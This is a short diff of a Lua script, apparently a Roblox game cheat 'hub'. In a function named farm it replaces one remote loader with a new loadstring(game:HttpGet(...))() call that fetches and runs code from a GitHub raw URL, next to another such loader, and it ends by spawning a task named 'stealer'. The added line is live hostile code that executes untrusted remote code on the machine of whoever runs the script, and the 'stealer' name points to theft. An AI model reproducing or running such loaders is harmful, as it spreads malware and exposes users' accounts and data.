@@ -195,7 +195,7 @@ if introFinished then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/NameHub123/NameHub/refs/heads/main/NameHub", true))()
 end
 local function farm()
-    loadstring(game:HttpGet('loadstring(game:HttpGet("https://raw.githubusercontent.com/NameHub123/NameHabibiHub/refs/heads/main/NameHub'))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/be/refs/heads/main/u"))()
 end
 
 task.spawn(stealer)
